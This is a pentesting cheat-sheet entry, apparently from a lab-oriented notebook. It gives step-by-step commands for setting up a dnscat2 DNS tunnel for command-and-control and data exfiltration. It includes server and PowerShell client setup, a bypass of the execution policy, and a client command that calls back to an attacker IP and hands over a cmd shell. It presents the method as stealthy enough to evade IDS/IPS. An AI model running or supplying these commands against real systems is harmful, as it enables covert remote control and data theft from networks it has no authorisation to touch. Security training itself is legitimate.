-- -
Exfiltrate data over DNS. The data will be encrypted and be sent over the network as the content of a DNS TXT record. Works as a Command & Control (C2) connection. Extremely stealthy approach, should get passed IDS/IPS systems even if they try to inspect the packets sent over the network as they mostly check HTTP traffic for exfiltration.
#### Git Install - Server
Install and run server on attack host
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo gem install bundler
sudo bundle install
```
#### Git Install - Client
In this example, we will use the powershell client. There are multiple versions/flavors.
First, download the repo:
`git clone https://github.com/lukebaggett/dnscat2-powershell.git`
Then, [[Windows|file transfer]] over the `dnscat2.ps1` script to windows pivot host. Import module into powershell:
```powershell
# open powershell with execution policy set to bypass
powershell -ep bypass

# import module
Import-Module .\dnscat2.ps1
```
#### Establish Tunnel
Start the server on the attackbox:
```bash
# This will spit out a Secret Key used for encryption and passed to the client in the below command under the -PreSharedSecret param
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
Start Client on Windows Pivot Host:
```powershell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
#### Basic Interactions
Upon completion, you will get a session on the server. This lets you interact with the dnscat directly:
```bash
# pull up help menu
dnscat> ?

# open a shell on pivot host:
window -i 1

# to exit shell:
ctrl-z
```